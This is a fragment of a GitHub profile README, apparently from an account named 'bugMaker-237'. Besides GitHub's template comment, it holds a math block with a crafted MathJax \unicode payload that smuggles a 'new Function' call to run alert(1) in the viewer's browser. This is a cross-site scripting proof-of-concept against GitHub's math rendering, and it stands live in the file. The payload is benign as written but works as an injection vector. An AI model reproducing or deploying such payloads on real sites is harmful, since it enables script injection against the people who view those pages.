...
<!--
**bugMaker-237/bugmaker-237** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
...
```math
\ce{$\unicode[goombafont; --script: new Function("setTimeout(function(){alert(1)}, 2000)")();]{x0000}$}
```
```math
